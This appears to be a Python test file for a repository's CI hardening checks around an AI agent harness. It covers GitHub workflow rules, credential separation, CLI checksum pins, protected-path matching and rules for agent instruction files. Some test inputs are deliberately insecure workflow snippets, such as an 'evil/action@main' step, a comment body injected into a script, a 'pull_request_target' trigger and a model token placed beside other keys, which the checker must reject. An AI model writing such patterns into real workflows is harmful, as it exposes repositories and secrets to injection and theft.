    def test_a_rule_is_not_dodged_by_writing_the_workflow_another_way(self):
        ways = {
            "a mapping on one line": (GOOD.replace(STEP, "      - {uses: evil/action@main, continue-on-error: true}\n"), "form"),
            "two spaces after the dash": (GOOD.replace(STEP, "      -  uses: actions/checkout@v7\n"), "form"),
            "a quoted key": (GOOD.replace("    runs-on:", '    "runs-on":'), "form"),
            "a colon set apart": (GOOD.replace(STEP, "      - uses : evil/action@main\n"), "form"),
            "an escaped event name": (GOOD.replace("  merge_group:\n", '  merge_group:\n  "pull_request\\x5ftarget":\n'), "form"),
            "a list on one line": (GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule: [{cron: '0 * * * *'}]\n"), "form"),
            "an anchor": (GOOD.replace(STEP, "      - run: &cmd make verify\n      - run: *cmd\n"), "form"),
            "another installer": (GOOD.replace(STEP, "      - run: pipx install ruff\n"), "install"),
            "a download in python": (GOOD.replace(STEP, '      - run: python3 -c "import urllib.request"\n'), "install"),
            "a failure swallowed in shell": (GOOD.replace(STEP, "      - run: make verify || true\n"), "install"),
            "read-all": (GOOD.replace("permissions: {}", "permissions: read-all"), "permissions"),
            "write-all on a job": (GOOD.replace("      contents: read\n", "      write-all\n"), "form"),
            "woken by another workflow": (GOOD.replace("  merge_group:\n", "  merge_group:\n  workflow_run:\n"), "wake"),
            "every thirty minutes": (GOOD.replace("  merge_group:\n", '  merge_group:\n  schedule:\n    - cron: "0,30 * * * *"\n'), "cron"),
            "a runner from a matrix": (GOOD.replace("ubuntu-24.04", "${{ matrix.os }}"), "runner"),
            "a runner in a list": (GOOD.replace("    runs-on: ubuntu-24.04\n", "    runs-on:\n      - ubuntu-latest\n"), "runner"),
            "a token in lower case": (GOOD.replace(STEP, STEP + "        env:\n          T: ${{ secrets.gh_pat }}\n"), "token"),
            "inherit in quotes": (GOOD.replace("  verify:\n", '  c:\n    uses: ./.github/workflows/o.yml\n    secrets: "inherit"\n  verify:\n'), "token"),
            "a branch filter": (GOOD.replace("  pull_request:\n", "  pull_request:\n    branches:\n      - release\n"), "queue"),
            "an expression in a script": (GOOD.replace(STEP, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n        with:\n          script: ${{ github.event.comment.body }}\n"), "expression"),
            "a checkout in quotes": (GOOD.replace("actions/checkout@", '"actions/checkout@').replace(" # v7.0.1\n        with:\n          persist-credentials: false", '" # v7.0.1'), "credentials"),
            "a limit named in a comment": (GOOD.replace("    timeout-minutes: 25\n", "").replace("ubuntu-24.04\n", "ubuntu-24.04 # timeout-minutes: later\n"), "timeout"),
            "windows line ends": (GOOD.replace("\n", "\r\n"), "form"),
            "a key written twice": (GOOD.replace("    timeout-minutes: 25\n", "    timeout-minutes: 25\n    timeout-minutes: 600\n"), "form"),
            "a step's key written twice": (GOOD.replace(STEP, "      - run: make verify\n        run: make evil\n"), "form"),
            "nothing at all": ("", "form"),
        }
        for name, (text, rule) in ways.items():
            self.assertIn(rule, rules(text), name)

    def test_a_workflow_that_keeps_the_rules_is_not_refused(self):
        fine = {
            "continue-on-error: false": GOOD.replace(STEP, STEP + "        continue-on-error: false\n"),
            "a comment naming a banned event": GOOD.replace("  pull_request:\n", "  pull_request:    # never pull_request_target\n"),
            "a secret whose name holds the letters": GOOD.replace(STEP, STEP + "        env:\n          K: ${{ secrets.RELAY_DISPATCH_KEY }}\n"),
            "the org's reusable at its channel": GOOD.replace("  verify:\n", "  shield:\n    uses: combsmith/.github/.github/workflows/agent-shield-reusable.yml@agent-shield/v2-stable\n  verify:\n"),
            "an off-zero schedule": POLLER.replace('"13 * * * *"', "'17,47 * * * *'"),
            "indented by four": "\n".join((len(l) - len(l.lstrip(" "))) * " " + l for l in GOOD.split("\n")),
        }
        for name, text in fine.items():
            self.assertEqual(rules(text), [], name)


    # The Run's three jobs, the approving act's one and the pass, each held word for word (issue 196, PR 2b-2).
    LIVE = ROOT / ".github" / "workflows"

    def test_the_runs_jobs_keep_each_key_apart_and_always_leave_the_outcome(self):
        good = (self.LIVE / "run-jobs.yml").read_text()
        self.assertEqual(check_workflows.run_jobs_problems(good), [])
        model = "          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}\n"
        reader = "          READER_APP_KEY: ${{ secrets.READER_APP_KEY }}\n"
        broken = {
            "the reader's key beside the model": good.replace(model, model + reader),
            "the model beside the reader's key": good.replace(reader, reader + model),
            "the reader's step after the model's": good.replace("        run: python3 -m harness.read\n", "        run: X\n")
                                                       .replace("        run: python3 -m harness.run\n",
                                                                "        run: python3 -m harness.read\n")
                                                       .replace("        run: X\n", "        run: python3 -m harness.run\n"),
            "a secret in verify": good.replace("          RUN_DIGEST: ${{ needs.run.outputs.digest }}\n        run: python3 -m harness.verify",
                                               "          RUN_DIGEST: ${{ needs.run.outputs.digest }}\n          K: ${{ secrets.PR_REVIEW_APP_KEY }}\n        run: python3 -m harness.verify"),
            "a cache in verify": good.replace("      - name: Verify the Result\n",
                                              "      - uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0\n"
                                              "        with:\n          path: x\n          key: y\n      - name: Verify the Result\n"),
            "apply skipped when run fails": good.replace("    if: always() && needs.run.outputs.commit != ''\n", ""),
            "apply on no commit": good.replace("    if: always() && needs.run.outputs.commit != ''\n", "    if: always()\n"),
            "an outcome a failure skips": good.replace("      - name: Leave the Run's outcome\n        if: always()\n",
                                                       "      - name: Leave the Run's outcome\n"),
            "the item's code checked out": good.replace("          ref: factory/v0-next\n",
                                                        "          ref: ${{ inputs.item }}\n", 1),
            "a model credential in apply": good.replace("          PR_REVIEW_APP_KEY: ${{ secrets.PR_REVIEW_APP_KEY }}\n",
                                                        "          PR_REVIEW_APP_KEY: ${{ secrets.PR_REVIEW_APP_KEY }}\n" + model),
            "the CLI unchecked": good.replace('          echo "${CLI_CHECKSUM}  /tmp/claude" | sha256sum -c\n', ""),
            "another checksum": good.replace(check_workflows.CLI_CHECKSUMS["2.1.306"], "0" * 64),
            "another version": good.replace('CLI_VERSION: "2.1.306"', 'CLI_VERSION: "2.1.307"'),
            "a later job on the Channel again": good.replace("          ref: ${{ needs.run.outputs.commit }}\n",
                                                             "          ref: factory/v0-next\n", 1),
            "a later job with no tags": good.replace("          fetch-tags: true\n", "", 1),
            "no commit handed on": good.replace("        run: python3 -m harness.steps\n", ""),
            "verify on an environment": good.replace("    needs: run\n    runs-on: ubuntu-24.04\n",
                                                     "    needs: run\n    runs-on: ubuntu-24.04\n    environment: factory-run\n"),
            "the model's step handed a tool list": good.replace("          CLAUDE_CLI: /usr/local/bin/claude\n",
                                                                "          CLAUDE_CLI: /usr/local/bin/claude\n          TOOLS: Bash\n"),
        }
        for why, text in broken.items():
            self.assertNotEqual(text, good, why)
            self.assertTrue(caught(check_workflows.run_jobs_problems(text), "it is not the Run's three jobs"), why)
        # Each file is held by its own name, wherever the check meets it.
        passed = (self.LIVE / "pass.yml").read_text()
        approving = (self.LIVE / "approve-job.yml").read_text()
        for name, text, said in (("run-jobs.yml", broken["another checksum"], "it is not the Run's three jobs"),
                                 ("pass.yml", passed.replace("      - if: always()\n        uses", "      - uses"),
                                  "it is not the pass"),
                                 ("approve-job.yml", approving.replace("timeout-minutes: 10", "timeout-minutes: 20"),
                                  "the approving act's one job")):
            self.assertTrue(caught(check_workflows.shim_problems(name, text), said), name)
        self.assertEqual(check_workflows.shim_problems("run-jobs.yml", good), [])
        # The CLI's version is the Engine's pin: a pin that moves without the checksum fails, as does none.
        harness = json.loads((ROOT / "config" / "harness.json").read_text())
        moved = tree({"config/harness.json": json.dumps(dict(harness, engine=dict(harness["engine"], version="2.1.307")))})
        self.assertTrue(caught(check_workflows.run_jobs_problems(good.replace('"2.1.306"', '"2.1.307"'), moved),
                               "CLI_CHECKSUMS holds no checksum for it"))
        with mock.patch.dict(check_workflows.CLI_CHECKSUMS, {"2.1.307": "1" * 64}):
            self.assertTrue(caught(check_workflows.run_jobs_problems(good, moved), "it is not the Run's three jobs"))
            # The pin, the workflow's version and its checksum moved together pass.
            together = good.replace('"2.1.306"', '"2.1.307"').replace(check_workflows.CLI_CHECKSUMS["2.1.306"], "1" * 64)
            self.assertEqual(check_workflows.run_jobs_problems(together, moved), [])
        none = tree({"config/harness.json": "{}"})
        self.assertTrue(caught(check_workflows.run_jobs_problems(good, none), "names no Engine pin"))

    def test_the_commit_a_later_job_checks_out_is_the_releases_own(self):  # decision 0066
        # A job output is as trusted as the step that writes it. `commit` is written by one step alone, `commit`, right
        # after `run` checks out the Channel and before the CLI is installed or any secret named, on the Release's own
        # code; GitHub keeps each step's outputs apart, so no later step can write it. And each later job checks out
        # that commit and names its Release from it before any step that holds a secret runs Factory code.
        entries, bad = check_workflows.read((self.LIVE / "run-jobs.yml").read_text())
        self.assertEqual(bad, [])

        def steps_of(job):
            found = {}
            for e in entries:
                if e["path"][:3] == ["jobs", job, "steps"] or (e["path"] == ["jobs", job, "steps"]):
                    found.setdefault(e["step"], []).append(e)
            return [found[n] for n in sorted(found)]

        def value(step, key, under=None):
            return next((e["value"] for e in step if e["key"] == key and (under is None or e["path"][-1] == under)), None)
        outputs = {e["key"]: e["value"] for e in entries if e["path"] == ["jobs", "run", "outputs"]}
        self.assertEqual(outputs["commit"], "${{ steps.commit.outputs.commit }}")
        ids = [e["value"] for e in entries if e["key"] == "id" and e["path"][-1] == "steps"]
        self.assertEqual(ids.count("commit"), 1)
        run = steps_of("run")
        self.assertTrue(value(run[0], "uses").startswith("actions/checkout@"))
        self.assertEqual(value(run[0], "ref"), "factory/v0-next")
        self.assertEqual((value(run[1], "id"), value(run[1], "run")), ("commit", "python3 -m harness.steps"))
        self.assertFalse([e for step in run[:2] for e in step if "secrets." in e["value"]])
        for job, first in (("verify", "python3 -m harness.verify"), ("apply", "python3 -m harness.apply_step")):
            these = steps_of(job)
            self.assertEqual(value(these[0], "ref"), "${{ needs.run.outputs.commit }}", job)
            self.assertEqual(value(these[0], "fetch-tags"), "true", job)
            factory = [n for n, step in enumerate(these) if (value(step, "run") or "").startswith("python3 -m ")]
            self.assertEqual(value(these[factory[0]], "run"), first, job)
            # No step before it holds a secret, and it names its Release before it reads one (tests/test_steps.py).
            self.assertFalse([e for step in these[:factory[0]] for e in step if "secrets." in e["value"]], job)

    def test_the_pass_uploads_its_record_before_it_dispatches(self):  # design section 2.3, steps 5 and 6
        good = (self.LIVE / "pass.yml").read_text()
        self.assertEqual(check_workflows.pass_problems(good), [])
        upload = ("      - name: Upload the pass record\n        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9"
                  " # v7.0.2\n        with:\n          name: pass\n          path: pass/pass.json\n          if-no-files-found: error\n")
        self.assertIn(upload, good)
        writes = good[good.index("      - name: Write what the pass decided\n"):good.index("      - if: always()\n")]
        broken = {
            "dispatched before the record": good.replace(upload, "").replace(writes, writes + upload),
            "the token beside the read": good.replace("        run: python3 -m controller\n",
                                                      "          WORKFLOW_TOKEN: ${{ github.token }}\n        run: python3 -m controller\n"),
            "no record of the writes": good[:good.index("      - if: always()\n")],
            "the writes' record a failure skips": good.replace("      - if: always()\n        uses", "      - uses"),
        }
        for why, text in broken.items():
            self.assertNotEqual(text, good, why)
            self.assertTrue(caught(check_workflows.pass_problems(text), "it is not the pass"), why)

    def test_the_approving_act_holds_the_approvers_token_alone(self):  # decision 0055
        good = (self.LIVE / "approve-job.yml").read_text()
        self.assertEqual(check_workflows.approve_job_problems(good), [])
        for why, text in {"a key beside it": good.replace("          APPROVER_TOKEN: ${{ secrets.APPROVER_TOKEN }}\n",
                                                          "          APPROVER_TOKEN: ${{ secrets.APPROVER_TOKEN }}\n"
                                                          "          PR_REVIEW_APP_KEY: ${{ secrets.PR_REVIEW_APP_KEY }}\n"),
                          "the item's code": good.replace("          ref: factory/v0-next\n", "          ref: ${{ inputs.item }}\n"),
                          "no outcome step": good.replace("        run: python3 -m harness.outcome\n", ""),
                          "an outcome a failure skips": good.replace("      - if: always()\n        uses: actions/upload-artifact@"
                                                                     "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
                                                                     "        with:\n          name: outcome",
                                                                     "      - uses: actions/upload-artifact@"
                                                                     "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
                                                                     "        with:\n          name: outcome")}.items():
            self.assertNotEqual(text, good, why)
            self.assertTrue(caught(check_workflows.approve_job_problems(text), "the approving act's one job"), why)

    def test_a_key_and_its_environment_are_named_by_their_one_file(self):  # decision 0035
        named = {"READER_APP_KEY": "run-jobs.yml", "factory-apply": "run-jobs.yml", "PR_REVIEW_APP_KEY": "run-jobs.yml",
                 "factory-run": "run-jobs.yml", "APPROVER_TOKEN": "approve-job.yml", "factory-approve": "approve-job.yml",
                 "CONTROLLER_APP_KEY": "pass.yml", "factory-poller": "pass.yml"}
        for key, owner in named.items():
            text = GOOD.replace("    permissions:\n      contents: read\n",
                                "    permissions:\n      contents: read\n    env:\n      X: %s\n" % key, 1)
            self.assertTrue(caught(check_workflows.shim_problems("other.yml", text),
                                   "it names a key or the environment that holds it, which only %s names" % owner), key)
            self.assertFalse(caught(check_workflows.shim_problems(owner, text), "which only %s names" % owner), key)
        # GitHub's names of these ignore case, and so does the rule.
        for spelt in ("Pr_Review_App_Key", "FACTORY-APPLY", "Factory-Poller"):
            text = GOOD.replace("    permissions:\n      contents: read\n",
                                "    permissions:\n      contents: read\n    env:\n      X: %s\n" % spelt, 1)
            self.assertTrue(caught(check_workflows.shim_problems("other.yml", text), "it names a key"), spelt)
        # A comment that names one names nothing.
        self.assertFalse(check_workflows.shim_problems("other.yml", "# READER_APP_KEY\n" + GOOD))

    def test_every_module_a_workflow_runs_is_in_the_repo(self):
        for path in sorted(self.LIVE.glob("*.yml")):
            for module in re.findall(r"python3 -m ([\w.]+)", path.read_text()):
                parts = module.split(".")
                found = ROOT.joinpath(*parts).with_suffix(".py").is_file() or (ROOT.joinpath(*parts) / "__main__.py").is_file()
                self.assertTrue(found, "%s runs %s" % (path.name, module))



class TheList(unittest.TestCase):
    """The protected paths and every Lens's input: one list, in config/hooks.json, that the session hooks read and the
    Kernel is given as `protected_paths` (decision 0020)."""

    HOOKS = json.loads((ROOT / "config" / "hooks.json").read_text())
    # The paths each criterion of the review's rubric applies to, read with the same matcher (decision 0029).
    RUBRIC = [p for c in json.loads((ROOT / "config" / "rubric-pr-review.json").read_text())["criteria"]
              for p in c.get("applies_when", {}).get("paths", [])]

    def test_the_kernels_matcher_and_the_hooks_agree_on_one_corpus(self):
        # Only the two matchers can drift, so they are held to each other: on every file in the repo, and on paths made
        # from each pattern, its wildcard standing for nothing, a letter or more than one name, in any case, below it,
        # beside it and above it. The rubric's patterns are among them, and `**` as a whole name.
        data = protected.load()
        patterns = [p for p, _ in data["protected"] + data["reported"]] + ["a/*", "*.json", "x*y*z/", "a*/b*/", "*"]
        patterns += self.RUBRIC + ["**", "**/", "a/**/b*/", "**/a/**", "a**b/c", "**/**/x"]
        self.assertLessEqual({"**/*.py", "kernel/**", "**/AGENTS.md"}, set(self.RUBRIC))
        corpus = {p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)}
        for pattern in patterns:
            for star in ("", "x", "x/y", "a.b", "*"):
                stem = pattern.replace("*", star)
                for end in ("", "/a", "/a/b.json", "x", ".bak"):
                    for path in (stem.rstrip("/") + end, "x/" + stem.rstrip("/") + end):
                        corpus |= {path, path.upper(), path.title()}
        corpus = sorted(p for p in corpus if derive.readable_name(p))
        self.assertGreater(len(corpus), 1000)
        for pattern in patterns:
            whole = protected.entries([(pattern, "")])[0][3]
            for path in corpus:
                self.assertEqual(derive.matches(pattern, path), bool(whole.match(path.casefold())), (pattern, path))

    def test_two_stars_as_a_whole_name_stand_for_any_run_of_names(self):  # decision 0029
        # `**` as a whole name stands for any run of names, none included; within a name it is two wildcards, each
        # within that name. The hooks read it alike (test_the_kernels_matcher_and_the_hooks_agree_on_one_corpus).
        for pattern, path, fits in (("**/*.py", "a.py", True), ("**/*.py", "a/b/c.py", True), ("**/*.py", "a/b.txt", False),
                                    ("kernel/**", "kernel", True), ("kernel/**", "kernel/a/b.py", True),
                                    ("kernel/**", "kernels/a.py", False), ("**/AGENTS.md", "AGENTS.md", True),
                                    ("**/AGENTS.md", "a/b/AGENTS.md", True), ("**/AGENTS.md", "a/xAGENTS.md", False),
                                    ("a/**/b", "a/b", True), ("a/**/b", "a/x/y/b", True), ("a/**/b", "a/x/y/c", False),
                                    ("a**b", "ab", True), ("a**b", "axyb", True), ("a**b", "ax/yb", False),
                                    ("docs/**/", "docs/a/b.md", True), ("docs/**/", "doc/a.md", False)):
            self.assertEqual(derive.matches(pattern, path), fits, (pattern, path))
            whole = protected.entries([(pattern, "")])[0][3]
            self.assertEqual(bool(whole.match(path.casefold())), fits, (pattern, path))

    def test_the_kernel_is_given_every_protected_path_and_lens_input(self):
        want = [e["path"] for e in self.HOOKS["protected"]] + [e["path"] for e in self.HOOKS["lens_inputs"]]
        self.assertEqual(protected.protected_paths(), want)
        self.assertEqual(support.CONFIG["protected_paths"], want)
        self.assertEqual(world.CONFIG["protected_paths"], want)
        # What is only reported, such as a decision record, is listed at a stop and is not on the Kernel's list.
        self.assertNotIn("docs/decisions/", want)

    def test_each_lens_input_is_a_required_lens_and_verifys_cover_every_check(self):
        lenses = {lens["lens"] for lens in support.CONFIG["required_lenses"]["deterministic"]}
        lenses |= set(support.CONFIG["required_lenses"]["model"])     # a model Lens's own inputs (issue 140)
        inputs = {}
        for entry in self.HOOKS["lens_inputs"]:
            self.assertIn(entry["lens"], lenses, entry["path"])
            inputs.setdefault(entry["lens"], []).append(entry["path"])
        # verify runs make, which reads GNUmakefile, makefile or Makefile, and every check and test where checks live;
        # `python3 -m` puts the top of the repo first on the path, so a module there shadows the standard library; and
        # the tests import the Kernel. The secret scan reads its configuration and the findings it is told to pass over.
        for path in ["Makefile", "makefile", "GNUmakefile", "json.py", "kernel/derive.py"] + [
                "%s/x.py" % where for where in check_context.CHECKS]:
            self.assertTrue(any(derive.matches(p, path) for p in inputs["verify"]), path)
        for path in (".gitleaks.toml", ".gitleaksignore"):
            self.assertTrue(any(derive.matches(p, path) for p in inputs["secret-scan"]), path)
        # Whatever the import system loads from the top of the repo ahead of the standard library, by every suffix it
        # knows here and Windows's: a module, a regular package's __init__, and the compiled modules. A directory with
        # no __init__ is a namespace package, which a module found later on the path wins over, so it shadows nothing.
        machinery = importlib.machinery
        suffixes = (machinery.SOURCE_SUFFIXES + machinery.BYTECODE_SUFFIXES + machinery.EXTENSION_SUFFIXES
                    + [".pyw", ".pyd", ".cp312-win_amd64.pyd", ".cpython-312-x86_64-linux-gnu.so", ".abi3.so"])
        for path in (["json" + s for s in suffixes] + ["unittest/__init__" + s for s in suffixes]
                     + ["__pycache__/json.cpython-39.pyc"]):
            self.assertTrue(any(derive.matches(p, path) for p in inputs["verify"]), path)

    def test_every_package_at_the_top_of_the_repo_is_a_lens_input_whole(self):
        # verify imports every regular package at the top of the repo, through any of its modules or the bytecode
        # cached for them. A package added without its own entry fails here.
        verify = [e["path"] for e in self.HOOKS["lens_inputs"] if e["lens"] == "verify"]
        packages = sorted({p.relative_to(ROOT).parts[0] for p in walk.files(ROOT)
                           if len(p.relative_to(ROOT).parts) == 2 and p.name.startswith("__init__.")})
        self.assertLessEqual({"kernel", "sim", "tests", "tools"}, set(packages))
        for package in packages:
            for path in ("%s/x.py" % package, "%s/a/b.py" % package, "%s/__pycache__/x.cpython-39.pyc" % package):
                self.assertTrue(any(derive.matches(p, path) for p in verify), path)

    def test_each_lens_workflow_file_is_protected(self):  # decision 0018
        patterns = [e["path"] for e in self.HOOKS["protected"]]
        for lens in support.CONFIG["required_lenses"]["deterministic"]:
            if lens["workflow"] is not None:
                self.assertTrue(any(derive.matches(p, lens["workflow"]) for p in patterns), lens["lens"])


class Context(unittest.TestCase):
    def test_a_rule_with_no_check_is_caught(self):
        root = tree({"tools/check_x.py": "", "README.md": "", "docs/a.md": ""})
        held = check_context._held
        self.assertTrue(caught(held("Reviewers look for it", "rule", root, root), "names no check"))
        self.assertEqual(held("`tools/check_x.py`", "rule", root, root), [])
        # A document that exists is not a check.
        self.assertTrue(caught(held("`README.md`", "rule", root, root), "names no check"))
        self.assertTrue(caught(held("the reviewers, see `docs/`", "rule", root, root), "names no check"))

    def test_a_rule_whose_wait_is_over_is_caught(self):
        root = tree({"harness/apply.py": "", "CODEOWNERS": ""})
        held = check_context._held
        self.assertEqual(held("waiting on `roles/`", "rule", root, root), [])
        self.assertEqual(held("Waiting on `roles/`", "rule", root, root), [])
        self.assertTrue(caught(held("waiting on `harness/`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `harness/never.py`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `.github/CODEOWNERS`", "rule", root, root), "exists now"))

    def test_a_wait_on_a_file_a_built_directory_plans_holds_until_the_file_exists(self):
        # Issue 191, ruling 2: a directory built in parts names, in its AGENTS.md, the files not built yet; a wait on
        # one of those holds until it exists, and a wait on any other file there has arrived, as a forgotten one would.
        root = tree({"harness/apply.py": "", "harness/AGENTS.md": "Not built yet, by later stories: later.py, x/y.py, run.test.py.\n"})
        held = check_context._held
        self.assertEqual(held("waiting on `harness/later.py`", "rule", root, root), [])
        self.assertEqual(held("waiting on `harness/x/y.py`", "rule", root, root), [])
        self.assertEqual(held("waiting on `harness/run.test.py`", "rule", root, root), [])
        self.assertTrue(caught(held("waiting on `harness/never.py`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `harness/`", "rule", root, root), "exists now"))
        (root / "harness" / "later.py").write_text("")
        self.assertTrue(caught(held("waiting on `harness/later.py`", "rule", root, root), "exists now"))
        # Before the directory exists, the wait is on it, whatever file the rule names.
        self.assertEqual(held("waiting on `roles/later.py`", "rule", root, root), [])

    def test_a_rule_that_cites_a_test_expected_to_fail_must_say_so(self):
        root = tree({"tests/t.py": "@pending\ndef test_later(self):\n    pass\n\ndef test_now(self):\n    pass\n"})
        held = check_context._held
        self.assertTrue(caught(held("`tests/t.py::test_later`", "rule", root, root), "is expected to fail"))
        self.assertEqual(held("not held yet: `tests/t.py::test_later`", "rule", root, root), [])
        self.assertTrue(caught(held("not held yet: `tests/t.py::test_now`", "rule", root, root), "names no test marked"))

    def test_a_wait_on_a_name_nothing_will_ever_have_is_caught(self):
        root = tree({"x": ""})
        self.assertTrue(caught(check_context._held("waiting on `someday/`", "rule", root, root), "not a planned"))

    def test_a_path_or_a_test_that_does_not_exist_is_caught(self):
        here = "class Real:\n    def test_present(self):\n        pass\n    # def test_gone(self): was deleted\n"
        text = ("See `tools/gone.py`, `scripts/gone.sh`, `toools/`, `harness/`, `tools/here.py:12`, [a link](docs/gone.md),\n"
                "`tools/here.py::test_missing`, `tools/here.py::test_gone`, `tools/here.py::Unreal.test_present`,\n"
                "`tools/here.py::Real.test_present` and [the rules](#12-rules). Run python3 -m tools.here.\n")
        root = tree({"docs/a.md": text, "tools/here.py": here})
        problems = check_context._references(root / "docs" / "a.md", text, root)
        self.assertEqual(len(problems), 7, problems)

    def test_a_number_without_its_title_is_caught(self):
        def found(text):
            root = tree({"docs/a.md": text})
            return check_context._references(root / "docs" / "a.md", text, root)
        for text in ("Fixed in #2225.", "See combsmith/x#2225.", "See pull request 2225.", "See PR 2225.",
                     'It "works". See pull request 2225.'):
            self.assertTrue(found(text), text)
        for text in ('See "docs: factory MVP" (pull request 2225).', "See \u201cdocs: factory MVP\u201d (issue 12)."):
            self.assertEqual(found(text), [], text)

    def test_a_root_file_too_long_to_read_in_full_is_caught(self):
        root = tree({"AGENTS.md": "line\n" * (check_context.ROOT_LINES + 1), "kernel/AGENTS.md": "x " * 200 + "\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "AGENTS.md is 61 lines; the limit is 60"))
        self.assertTrue(caught(problems, "kernel/AGENTS.md has a line over"))

    def test_a_rule_in_any_agents_file_must_name_its_check(self):
        root = tree({"AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be kind | `tools/x.py` |\n", "tools/x.py": "",
                     "tools/AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be careful | reviewers |\n",
                     "sim/AGENTS.md": "| Rule | Check |\n|---|---|\n| Be quick | `tools/x.py` |\n",
                     "tests/AGENTS.md": "- Be thorough.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "tools/AGENTS.md, rule 'Be careful': names no check"))
        self.assertTrue(caught(problems, "sim/AGENTS.md: a table of rules must end in a column headed 'Held by'"))
        self.assertTrue(caught(problems, "tests/AGENTS.md: no table of rules"))
        self.assertFalse(caught(problems, "AGENTS.md, rule 'Be kind'"))

    def test_a_date_in_what_is_always_read_is_caught(self):
        root = tree({"AGENTS.md": "Decided on 2026-10-11.\n", "CLAUDE.md": "See AGENTS.md, and also these rules.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "holds a date") and caught(problems, "CLAUDE.md must hold the one line"))

    def test_a_second_set_of_rules_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "CLAUDE.md": "@AGENTS.md\n", "kernel/CLAUDE.md": "Do as you like.\n",
                     ".github/copilot-instructions.md": "x\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "kernel/CLAUDE.md is a second set of rules"))
        self.assertTrue(caught(problems, "copilot-instructions.md is a second set of rules"))
        self.assertEqual(check_context._agents_files(tree({"x": ""})), ["AGENTS.md is missing"])

    def test_a_directory_with_no_rules_of_its_own_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "kernel/decide.py": ""})
        self.assertTrue(caught(check_context._agents_files(root), "kernel/ has no AGENTS.md"))

    def test_a_decision_with_no_boundary_is_caught(self):
        record = "# 0001. X\n\n## Decision\n\nY.\n\n## Why\n\nZ.\n"
        self.assertTrue(caught(check_context._decisions(tree({"docs/decisions/0001-x.md": record})), "names no boundary"))
        extra = record + "\n## Boundaries\n\n| B | Check |\n|---|---|\n| b | `tools/x.py` |\n\n## Not yet held\n\nA wish.\n"
        root = tree({"docs/decisions/0001-x.md": extra, "docs/decisions/0003-y.md": extra, "tools/x.py": ""})
        problems = check_context._decisions(root)
        self.assertTrue(caught(problems, "a section 'Not yet held'"))
        self.assertTrue(caught(problems, "0003-y.md: records are numbered from 0001 with no gap"))
        self.assertTrue(caught(problems, "0003-y.md: the title must open with its number"))

    def test_a_lesson_with_no_check_is_caught(self):
        text = ("### L-01 A thing broke\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n\n"
                "## L-02 Another\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n")
        problems = check_context._lessons(tree({"docs/lessons.md": text}))
        self.assertTrue(caught(problems, "L-01 has no Check"))
        self.assertTrue(caught(problems, "must be a third-level heading"))

    def test_a_standard_with_prose_and_no_example_is_caught(self):
        root = tree({"docs/standards/code.md": "# Code\n\n## Be careful\n\nPlease.\n\nHeld by: `tools/`\n", "tools/x.py": ""})
        self.assertTrue(caught(check_context._standards(root), "the example comes before the prose"))

    def test_a_standard_over_one_page_is_caught(self):
        # A standard is one page. The workflows page also shows the required check's workflow, its first yaml block,
        # word for word as check_workflows holds it, so that block is not counted there, and nothing else is.
        page = "# %s\n\n## Be careful\n\n```yaml\n%s```\n\n%sOrg standard: none. This repo's own.\nHeld by: `tools/`\n"
        block, prose = "x: 1\n" * 130, "Words.\n" * 130
        for name, text, over in (("code", page % ("Code", block, ""), True),
                                 ("workflows", page % ("Workflows", block, ""), False),
                                 ("workflows", page % ("Workflows", "x: 1\n", prose), True),
                                 # The first yaml block alone: prose between it and a later fence still counts.
                                 ("workflows", page % ("Workflows", "x: 1\n", prose + "```\nx\n```\n"), True)):
            problems = check_context._standards(tree({"docs/standards/%s.md" % name: text, "tools/x.py": ""}))
            self.assertEqual(caught(problems, "%s.md is over one page" % name), over, name)

    def test_a_standard_that_cites_no_org_standard_is_caught(self):
        page = "# Code\n\n## Be careful\n\n```\nx\n```\n\n%sHeld by: `tools/`\n"
        bare = check_context._standards(tree({"docs/standards/code.md": page % "", "tools/x.py": ""}))
        cited = check_context._standards(tree({"docs/standards/code.md": page % "Org standard: none. This repo's own.\n",
                                               "tools/x.py": ""}))
        self.assertTrue(caught(bare, "no 'Org standard:' line") and not caught(cited, "no 'Org standard:' line"))

    def test_a_skill_the_root_file_does_not_point_to_is_caught(self):
        good = "---\nname: run-it\ndescription: Run it, when a story asks for it.\n---\n\n# Run it\n"
        pointer = "Read `.claude/skills/run-it/SKILL.md`.\n"
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": good})), [])
        quoted = good.replace("name: run-it", 'name: "run-it"').replace("description: Run it", "description: >\n  Run it")
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": quoted})), [])
        root = tree({"AGENTS.md": "Not `.claude/skills/run-it/SKILL.md.old`, nor x.claude/skills/run-it/SKILL.mdx\n",
                     ".claude/skills/run-it/SKILL.md": good, ".claude/skills/other/SKILL.md": "# Other\n",
                     ".claude/skills/third/SKILL.md": good.replace("description: Run it, when a story asks for it.", "description:"),
                     ".claude/skills/fourth/SKILL.md": good.replace("run-it", "fourth").replace("description: Run it, when a story asks for it.",
                                                                                                 "description: >\n")})
        problems = check_context._skills(root)
        for words in ("run-it/SKILL.md: the root AGENTS.md does not point to it", "other/SKILL.md: opens with no frontmatter",
                      "third/SKILL.md: is named run-it; a skill is named for its directory", "third/SKILL.md: no description",
                      "fourth/SKILL.md: no description"):
            self.assertTrue(caught(problems, words), words)
